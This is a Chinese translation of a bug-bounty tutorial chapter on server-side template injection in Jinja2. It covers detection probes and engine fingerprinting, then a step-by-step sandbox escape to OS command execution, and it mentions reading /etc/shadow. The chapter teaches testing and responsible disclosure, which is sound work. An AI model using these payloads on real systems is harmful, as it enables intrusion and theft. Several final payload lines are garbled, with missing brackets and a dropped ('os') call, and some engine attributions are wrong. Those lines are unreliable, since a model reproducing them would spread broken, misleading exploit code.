# 第十六章：模板注入

![](img/chapterart.png)

*模板引擎* 是一种用于决定网页外观的软件。开发人员常常忽视针对这些引擎的攻击，称为 *服务器端* *模板注入（**SSTI**）*，但这些攻击可能导致严重的后果，如远程代码执行。近年来，这类攻击变得更加普遍，像 Uber 和 Shopify 等组织的应用程序中也曾发现过这类漏洞。

在本章中，我们将深入探讨这种漏洞的机制，重点关注使用 Jinja2 模板引擎的 Web 应用程序。在确认我们能够向应用程序提交模板注入后，我们将利用 Python 沙箱逃逸技巧，在服务器上运行操作系统命令。

利用不同的模板引擎需要不同的语法和方法，但本章将为你提供一个很好的介绍，帮助你理解如何在任何系统中寻找和利用模板注入漏洞。

## 机制

要理解模板注入是如何工作的，你需要了解它们所针对的模板引擎的机制。简单来说，模板引擎将应用程序数据与 Web 模板结合，生成网页。这些 Web 模板使用像 Jinja 这样的模板语言编写，提供了一个让开发人员指定页面如何渲染的方式。Web 模板和模板引擎结合起来，使开发人员在 Web 开发过程中可以将服务器端应用逻辑和客户端展示代码分离。

### 模板引擎

让我们来看一下 Jinja，这是一个用于 Python 的模板语言。下面是一个用 Jinja 编写的模板文件。我们将把这个文件保存为 *example.jinja*：

```
<html> <body>1 <h1>{{ list_title }}</h1> <h2>{{ list_description }}</h2>2 {% for item in item_list %} {{ item }} {% if not loop.last %},{% endif %} {% endfor %} </body>
</html>
```

如你所见，这个模板文件看起来像普通的 HTML。然而，它包含了特殊的语法，用于指示模板引擎将其解释为模板代码。在 Jinja 中，任何被双大括号 `{{ }}` 包围的代码都应被解释为 Python 表达式，而任何被大括号和百分号符号 `{% %}` 包围的代码应被解释为 Python 语句。

在编程语言中，*表达式* 是一个变量或返回值的函数，而 *语句* 是不返回任何值的代码。这里，你可以看到模板首先将表达式 `list_title` 和 `list_description` 嵌入到 HTML 头部标签 1 中。然后，它创建一个循环，在 HTML 主体 2 中渲染 `item_list` 变量中的所有项。

现在，开发人员可以将模板与 Python 代码结合，创建完整的 HTML 页面。以下 Python 代码从 *example.jinja* 中读取模板文件，并通过为模板引擎提供要插入模板的值，动态生成 HTML 页面：

```
from jinja2 import Template with open('example.jinja') as f: 1 tmpl = Template(f.read()) print(tmpl.render( 2 list_title = 3 "Chapter Contents", list_description = 4 "Here are the contents of chapter 16.", item_list = 5 ["Mechanisms Of Template Injection", "Preventing Template Injection", "Hunting For Template Injection", \
"Escalating Template Injection", "Automating Template Injection", "Find Your First Template Injection!"]
))
```

首先，Python 代码读取名为*example.jinja*的模板文件 1。然后，它通过为模板提供所需的值来动态生成 HTML 页面 2。你可以看到，代码正在渲染模板，将值`Chapter Contents`作为`list_title` 3，`Here are the contents of chapter 16.`作为`list_description` 4，以及一组值——`Mechanisms Of Template Injection`、`Preventing Template Injection`、`Hunting For Template Injection`、`Escalating Template Injection`、`Automating Template Injection`和`Find Your First Template Injection!`——作为`item_list` 5。

模板引擎将结合 Python 脚本中提供的数据和模板文件*example.jinja*，生成这个 HTML 页面：

```
<html> <body> <h1>Chapter Contents</h1> <h2>Here are the contents of chapter 16.</h2> Mechanisms Of Template Injection, Preventing Template Injection, Hunting For Template Injection, Escalating Template Injection, Automating Template Injection, Find Your First Template Injection! </body>
</html>
```

模板引擎使得渲染网页更加高效，因为开发者可以通过重用模板以标准化的方式呈现不同的数据集。当开发者需要生成具有自定义内容的同一格式的页面时，这一功能尤为有用，例如批量邮件、在线市场中的单个商品页面以及不同用户的个人资料页面。将 HTML 代码和应用程序逻辑分开，也使得开发者更容易修改和维护 HTML 代码的部分内容。

市面上流行的模板引擎包括 Jinja、Django 和 Mako（与 Python 配合使用）、Smarty 和 Twig（与 PHP 配合使用）以及 Apache FreeMarker 和 Apache Velocity（与 Java 配合使用）。我们将在本章后面讲解如何在应用程序中识别这些模板引擎。

### 注入模板代码

模板注入漏洞发生在用户能够将输入注入到模板中而没有经过适当的清理时。我们之前的例子没有受到模板注入漏洞的影响，因为它没有将用户输入嵌入到模板中。它只是将一组硬编码的值作为`list_title`、`list_description`和`item_list`传递给模板。即使前面的 Python 代码段确实像这样将用户输入传递到模板中，代码也不会受到模板注入的影响，因为它是安全地将用户输入作为数据传递到模板中的：

```
from jinja2 import Template
with open('example.jinja') as f: tmpl = Template(f.read())
print(tmpl.render( 1 list_title = user_input.title, 2 list_description = user_input.description, 3 item_list = user_input.list,
))
```

如你所见，代码明确指出`user_input`的标题部分只能作为`list_title` 1 使用，`user_input`的描述部分是`list_description` 2，`user_input`的列表部分可以作为模板的`item_list` 3。

然而，有时开发者将模板视为编程语言中的字符串，并直接将用户输入拼接到其中。这时问题就出在这里，因为模板引擎无法区分用户输入和开发者的模板代码。

这是一个例子。以下程序接受用户输入并将其插入到 Jinja 模板中，以在 HTML 页面上显示用户的名字：

```
from jinja2 import Template
tmpl = Template("
<html><h1>The user's name is: " + user_input + "</h1></html>")1 print(tmpl.render())2
```

代码首先通过将 HTML 代码和用户输入拼接在一起创建模板 1，然后渲染该模板 2。

如果用户提交 GET 请求到该页面，网站将返回一个显示他们名字的 HTML 页面：

```
GET /display_name?name=Vickie
Host: example.com
```

这个请求将导致模板引擎渲染以下页面：

```
<html> <h1>The user's name is: Vickie</h1>
</html>
```

现在，如果你提交了如下的 payload，会怎么样呢？

```
GET /display_name?name={{1+1}}
Host: example.com
```

你没有提交一个名字作为`name`参数，而是提交了一个对模板引擎具有特殊意义的表达式。Jinja2 将任何双大括号`{{ }}`中的内容解释为 Python 代码。你会注意到在生成的 HTML 页面中有些奇怪的地方。页面没有显示字符串`The user's name is: {{1+1}}`，而是显示了字符串`The user's name is: 2`：

```
<html> <h1>The user's name is: 2</h1>
</html>
```

刚才发生了什么？当你提交`{{1+1}}`作为你的名字时，模板引擎误将`{{ }}`中包含的内容视为 Python 表达式，因此执行了`1+1`并返回了数字`2`。

这意味着你可以提交任何你想要的 Python 代码，并将结果返回到 HTML 页面中。例如，`upper()`是 Python 中的一个方法，用于将字符串转换为大写。试着提交以下代码片段`{{'Vickie'.upper()}}`，像这样：

```
GET /display_name?name={{'Vickie'.upper()}}
Host: example.com
```

你应该看到像这样返回的 HTML 页面：

```
<html> <h1>The user's name is: VICKIE</h1>
</html>
```

你可能注意到模板注入与 SQL 注入类似。如果模板引擎无法确定用户提供的数据的结束位置以及模板逻辑的起始位置，模板引擎就会将用户输入误认为模板代码。在这种情况下，攻击者可以提交任意代码，并让模板引擎将其输入当作源代码执行！

根据被攻击应用程序的权限，攻击者可能通过模板注入漏洞读取敏感文件或提升在系统上的权限。我们将在本章稍后讨论如何提升模板注入攻击。

## 防范

如何防止这个危险的漏洞呢？第一种方法是定期修补和更新应用程序使用的框架和模板库。许多开发者和安全专家已经意识到模板注入的危险。因此，模板引擎发布了各种缓解措施来防御这种攻击。不断更新软件到最新版本将确保您的应用程序免受新攻击向量的威胁。

你还应该尽量防止用户提供自定义模板。如果这不可行，许多模板引擎提供了一个强化的沙盒环境，你可以用来安全地处理用户输入。这些沙盒环境去除了潜在危险的模块和函数，使得用户提交的模板更加安全地进行评估。然而，研究人员已经发布了许多沙盒逃逸漏洞，因此这绝不是万无一失的方法。沙盒环境的安全性也与其配置密切相关。

为模板中允许的属性实现白名单，以防止我将在本章中介绍的那种 RCE 漏洞。此外，有时模板引擎会抛出描述性错误，帮助攻击者开发漏洞利用。你应该妥善处理这些错误，并向用户返回一个通用的错误页面。最后，在将用户输入嵌入网页模板之前进行过滤，并尽量避免将用户提供的数据注入到模板中。

## 寻找模板注入

与寻找许多其他漏洞一样，寻找模板注入的第一步是识别应用程序中接受用户输入的位置。

### 第一步：查找用户输入位置

查找可以向应用程序提交用户输入的位置。这些位置包括 URL 路径、参数、片段、HTTP 请求头和主体、文件上传等。

模板通常用于根据存储的数据或用户输入动态生成网页。例如，应用程序通常使用模板引擎根据用户的信息生成定制的电子邮件或主页。因此，要寻找模板注入漏洞，应该查找那些接受用户输入并最终会返回给用户的端点。由于这些端点通常与可能发生 XXS 攻击的端点重合，因此可以使用第六章中概述的策略来识别模板注入的潜在位置。记录这些输入位置以便进一步测试。

### 第二步：通过提交测试有效载荷来检测模板注入

接下来，通过将测试字符串注入到你在上一阶段识别的输入字段中来检测模板注入漏洞。该测试字符串应包含模板语言中常用的特殊字符。我喜欢使用字符串`{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]`，因为它旨在引发流行模板引擎中的错误。`${...}`是 FreeMarker 和 Thymeleaf Java 模板中的表达式语法；`{{...}}`是 PHP 模板（如 Smarty 或 Twig）以及 Python 模板（如 Jinja2）中的表达式语法；`<%= ... %>`是嵌入式 Ruby 模板（ERB）的语法。而`[``random expression``]`会让服务器将随机表达式解释为列表项，如果用户输入被放置到模板中的表达式标签中（我们稍后会讨论这种场景的一个示例）。

在这个有效载荷中，我让模板引擎解析名为`abcxx`的变量，该变量可能在应用程序中未定义。如果你从这个有效载荷中收到应用程序错误，那是模板注入的一个良好迹象，因为这意味着模板引擎将特殊字符视为特殊字符。但是，如果服务器上抑制了错误信息，你需要使用另一种方法来检测模板注入漏洞。

尝试将这些测试有效载荷`${7*7}`、`{{7*7}}`和`<%= 7*7 %>`提供给输入字段。这些有效载荷旨在检测各种模板语言中的模板注入。`${7*7}`适用于 FreeMarker 和 Thymeleaf Java 模板；`{{7*7}}`适用于 PHP 模板，如 Smarty 或 Twig，以及 Python 模板，如 Jinja2；`<%= 7*7 %>`适用于 ERB 模板。如果返回的任何响应包含表达式的结果`49`，这意味着数据被模板引擎解释为代码：

```
GET /display_name?name={{7*7}}
Host: example.com
```

在测试这些端点的模板注入时，请记住，成功的有效载荷并不总是立即返回结果。一些应用程序可能会将你的有效载荷插入到其他地方的模板中。你的注入结果可能会出现在未来的网页、电子邮件和文件中。在提交有效载荷和用户输入在模板中呈现之间，也可能会有时间延迟。如果你正在攻击这些端点中的一个，你需要注意寻找有效载荷成功的迹象。例如，如果一个应用程序在生成批量电子邮件时不安全地呈现了输入字段，你需要查看生成的电子邮件，检查你的攻击是否成功。

三个测试有效载荷`${7*7}`、`{{7*7}}`和`<%= 7*7 %>`在用户输入作为纯文本插入模板时有效，如以下代码片段所示：

```
from jinja2 import Template
tmpl = Template("
<html><h1>The user's name is: " + user_input + "</h1></html>")print(tmpl.render())
```

但是，如果用户输入作为模板逻辑的一部分拼接到模板中，会发生什么呢？如以下代码片段所示。

```
from jinja2 import Template
tmpl = Template("
<html><h1>The user's name is: {{" + user_input + "}}</h1></html>")print(tmpl.render())
```

在这里，用户输入被放置在表达式标签`{{...}}`中的模板内。因此，你不需要为服务器提供额外的表达式标签来将输入解释为代码。在这种情况下，检测输入是否被解释为代码的最佳方式是提交一个随机表达式，看看它是否被解释为表达式。在这种情况下，你可以在字段中输入`7*7`，看看是否返回`49`：

```
GET /display_name?name=7*7
Host: example.com
```

### 第 3 步：确定使用的模板引擎

一旦你确认了模板注入漏洞，确定使用的模板引擎，以便找出如何最好地利用这个漏洞。为了升级攻击，你必须使用特定模板引擎预期的编程语言来编写有效载荷。

如果你的有效载荷导致了一个错误，错误信息本身可能包含模板引擎的名称。例如，提交我的测试字符串`{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]`到我们的示例 Python 应用程序，会导致一个描述性错误，告诉我该应用程序使用的是 Jinja2：

```
jinja2.exceptions.UndefinedError: 'abcxx' is undefined
```

否则，您可以通过提交特定于流行模板语言的测试负载来确定正在使用的模板引擎。例如，如果您提交 `<%= 7*7 %>` 作为负载并返回 `49`，则该应用程序可能使用了 ERB 模板。如果成功的负载是 `${7*7}`，则模板引擎可能是 Smarty 或 Mako。如果成功的负载是 `{{7*7}}`，则应用程序可能使用的是 Jinja2 或 Twig。此时，您可以提交另一个负载 `{{7*'7'}}`，在 Jinja2 中返回 `7777777`，在 Twig 中返回 `49`。这些测试负载来自 PortSwigger 的研究：[`portswigger.net/research/server-side-template-injection/`](https://portswigger.net/research/server-side-template-injection/)。

除了我提到的模板引擎外，Web 应用程序还使用了许多其他模板引擎。许多模板引擎设计了类似的特殊字符，以避免干扰正常的 HTML 语法，因此您可能需要执行多个测试负载，才能明确确定您正在攻击的模板引擎类型。

## 升级攻击

一旦您确定了正在使用的模板引擎，您就可以开始提升已发现的漏洞了。大多数情况下，您可以仅使用前面章节中介绍的 `7*7` 负载来向安全团队证明模板注入。但是，如果您能够证明模板注入不仅仅能进行简单的数学运算，您可以证明漏洞的影响并展示其价值给安全团队。

您提升攻击的方法将取决于您正在攻击的模板引擎。要了解更多信息，请阅读该模板引擎及其伴随的编程语言的官方文档。在这里，我将展示如何通过模板注入漏洞在运行 Jinja2 的应用程序中实现系统命令执行。

能够执行系统命令对攻击者来说是极其有价值的，因为这可能允许他们读取敏感的系统文件，例如客户数据和源代码文件，更新系统配置，提升他们在系统上的权限，并攻击网络中的其他机器。例如，如果攻击者能够在 Linux 机器上执行任意系统命令，他们可以通过执行命令 `cat /etc/shadow` 来读取系统的密码文件。然后，他们可以使用密码破解工具破解系统管理员的加密密码，从而获得管理员账户的访问权限。

### 通过 Python 代码搜索系统访问

让我们回到之前的示例应用程序。我们已经知道，您可以通过这种模板注入漏洞执行 Python 代码。那么，如何通过注入 Python 代码来执行系统命令呢？

```
from jinja2 import Template
tmpl = Template("
<html><h1>The user's name is: " + user_input + "</h1></html>")print(tmpl.render())
```

通常在 Python 中，您可以通过 `os` 模块中的 `os.system()` 函数执行系统命令。例如，这行 Python 代码将执行 Linux 系统命令 `ls` 来显示当前目录的内容：

```
os.system('ls')
```

然而，如果你将此有效载荷提交到我们的示例应用程序，你很可能不会得到预期的结果：

```
GET /display_name?name={{os.system('ls')}}
Host: example.com
```

相反，你可能会遇到应用程序错误：

```
jinja2.exceptions.UndefinedError: 'os' is undefined
```

这是因为`os`模块在模板的环境中无法识别。默认情况下，它不包含像`os`这样的危险模块。通常，你可以通过`import` `MODULE`、`from` `MODULE` `import *` 或最后使用`__import__('MODULE')`语法来导入 Python 模块。让我们尝试导入`os`模块：

```
GET /display_name?name="{{__import__('os').system('ls')}}"
Host: example.com
```

如果你将此有效载荷提交到应用程序，可能会看到另一个错误返回：

```
jinja2.exceptions.UndefinedError: '__import__' is undefined
```

这是因为你无法在 Jinja 模板中导入模块。大多数模板引擎会阻止使用危险功能，如`import`，或者会设置一个允许列表，只允许用户在模板中执行某些操作。要逃避这些 Jinja2 的限制，你需要利用 Python 沙盒逃逸技术。

### 通过使用 Python 内置函数逃脱沙盒

其中一种技术是使用 Python 的内置函数。当你无法导入某些有用的模块或根本无法导入任何模块时，你需要调查 Python 默认已导入的函数。许多这些内置函数作为 Python 的`object`类的一部分进行集成，这意味着当我们想调用这些函数时，我们可以创建一个对象并将该函数作为对象的方法进行调用。例如，以下 GET 请求包含列出可用 Python 类的 Python 代码：

```
GET /display_name?name="{{[].__class__.__bases__[0].__subclasses__()}}"
Host: example.com
```

当你将此有效载荷提交到模板注入端点时，应该会看到如下类的列表：

```
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>...]
```

为了更好地理解这里发生了什么，让我们稍微分析一下这个有效载荷：

```
[].__class__.__bases__[0].__subclasses__()
```

它首先创建一个空列表并调用其`__class__`属性，该属性引用该实例所属的类，即`list`：

```
[].__class__
```

然后你可以使用`__bases__`属性来引用`list`类的基类：

```
[].__class__.__bases__
```

该属性将返回一个元组（在 Python 中就是一个有序列表），该元组包含`list`类的所有基类。*基类*是当前类构建自的类；`list`类有一个名为`object`的基类。接下来，我们需要通过引用元组中的第一个项来访问`object`类：

```
[].__class__.__bases__[0]
```

最后，我们使用`__subclasses__()`来引用该类的所有子类：

```
[].__class__.__bases__[0].__subclasses__()
```

当我们使用这种方法时，`object`类的所有子类都能对我们开放！现在，我们只需要在这些类中查找可以用于命令执行的方法。让我们探索一种可能的代码执行方式。在继续之前，请记住，并非每个应用程序的 Python 环境都会有相同的类。此外，接下来我将讨论的有效载荷可能并不适用于所有目标应用程序。

`__import__`函数是 Python 的内建函数，可以用来导入模块。但由于 Jinja2 阻止了对它的直接访问，你需要通过`builtins`模块来访问它。这个模块提供对 Python 所有内建类和函数的直接访问。大多数 Python 模块都有一个`__builtins__`属性，指向内建模块，因此你可以通过引用`__builtins__`属性来恢复`builtins`模块。

在`[].__class__.__bases__[0].__subclasses__()`的所有子类中，有一个名为`catch_warnings`的类。我们将使用这个子类来构建我们的漏洞利用。为了找到`catch_warnings`子类，可以在模板代码中注入一个循环来查找它：

```
1 {% for x in [].__class__.__bases__[0].__subclasses__() %}2 {% if 'catch_warnings' in x.__name__ %}3 {{x()}}
{%endif%}
{%endfor%}
```

这个循环遍历`[].__class__.__bases__[0].__subclasses__()`中的所有类，并找到名字中包含字符串`catch_warnings`的类。然后它实例化该类的对象。`catch_warnings`类的对象具有一个名为`_module`的属性，它指向`warnings`模块。

最后，我们使用对模块的引用来引用`builtins`模块：

```
{% for x in [].__class__.__bases__[0].__subclasses__() %}
{% if 'catch_warnings' in x.__name__ %}
{{x()._module.__builtins__}}
{%endif%}
{%endfor%}
```

你应该看到返回的内建类和函数列表，其中包括`__import__`函数：

```
{'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the 'nil' object; Ellipsis represents '...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, **'__import__': <built-in function __import__>,** 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, ...}
```

我们现在有了一种访问导入功能的方法！由于内建类和函数存储在 Python 字典中，你可以通过引用该函数条目在字典中的键来访问`__import__`函数：

```
{% for x in [].__class__.__bases__[0].__subclasses__() %}
{% if 'catch_warnings' in x.__name__ %}
{{x()._module.__builtins__**['__import__']**}}
{%endif%}
{%endfor%}
```

现在我们可以使用`__import__`函数来导入`os`模块。你可以通过提供模块名称作为参数来用`__import__`导入模块。在这里，我们导入`os`模块，以便能够访问`system()`函数：

```
{% for x in [].__class__.__bases__[0].__subclasses__() %}
{% if 'catch_warnings' in x.__name__ %}
{{x()._module.__builtins__['__import__']**('os')**}}
{%endif%}
{%endfor%}
```

最后，调用`system()`函数，并将我们想要执行的命令作为`system()`函数的参数：

```
{% for x in [].__class__.__bases__[0].__subclasses__() %}
{% if 'catch_warnings' in x.__name__ %}
{{x()._module.__builtins__'__import__'.system**('ls')**}}
{%endif%}
{%endfor%}
```

你应该看到返回的`ls`命令的结果。这个命令列出了当前目录的内容。你已经成功执行了命令！现在，你应该能够通过这个模板注入执行任意的系统命令。

### 提交有效载荷进行测试

出于测试目的，你应该执行一些不会对目标系统造成伤害的代码。验证你已成功执行命令并获取操作系统访问权限的常见方法是，在系统上创建一个具有独特文件名的文件，比如*template_injection_by_YOUR_BUG_BOUNTY_USERNAME.txt*，这样该文件就明确成为你概念验证的一部分。使用`touch`命令在当前目录下创建一个具有指定名称的文件：

```
{% for x in [].__class__.__bases__[0].__subclasses__() %}
{% if 'warning' in x.__name__ %}
{{x()._module.__builtins__'__import__'.system('touch template_injection_by_vickie.txt')}}
{%endif%}
{%endfor%}
```

不同的模板引擎需要不同的升级技巧。如果你对这个领域感兴趣，我鼓励你进行更多的研究。代码执行和沙箱逃逸是非常迷人的话题。我们将在第十八章讨论更多关于如何在目标系统上执行任意代码的内容。如果你对沙箱逃逸感兴趣，这些文章更详细地讨论了这一话题（本章的示例来自《程序员帮助》中的一个提示）：

+   CTF Wiki, https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/

+   HackTricks, [`book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes/`](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes/)

+   Programmer Help, [`programmer.help/blogs/python-sandbox-escape.html`](https://programmer.help/blogs/python-sandbox-escape.html)

## 自动化模板注入

为每个目标系统开发漏洞利用可能会非常耗时。幸运的是，模板通常包含了其他人已经发现的已知漏洞，因此当你发现模板注入漏洞时，最好自动化漏洞利用过程，以提高工作效率。

有一个工具专门用于自动化模板注入过程，叫做 tplmap ([`github.com/epinna/tplmap/`](https://github.com/epinna/tplmap/))，它可以扫描模板注入、确定使用的模板引擎，并构建漏洞利用。虽然该工具不支持所有模板引擎，但它应该能为你提供一个针对最流行引擎的良好起点。

## 发现你的第一个模板注入漏洞！

现在是时候按照我们在本章讨论的步骤，找到你的第一个模板注入漏洞了：

1.  识别任何可以向应用程序提交用户输入的机会。标记模板注入的候选项以便进一步检查。

1.  通过提交测试负载来检测模板注入。你可以使用旨在引发错误的负载，或者是专为模板引擎设计的负载，旨在被模板引擎评估。

1.  如果你发现一个易受模板注入攻击的端点，确定使用的模板引擎。这将帮助你构建特定于模板引擎的漏洞利用。

1.  研究目标使用的模板引擎和编程语言，以便构建漏洞利用。

1.  尝试将漏洞升级为任意命令执行漏洞。

1.  创建一个不会损害目标系统的概念验证。一个好的方法是执行 `touch template_injection_by_``YOUR_NAME``.txt` 来创建一个特定的概念验证文件。

1.  起草你的第一个模板注入报告，并将其发送给相关组织！
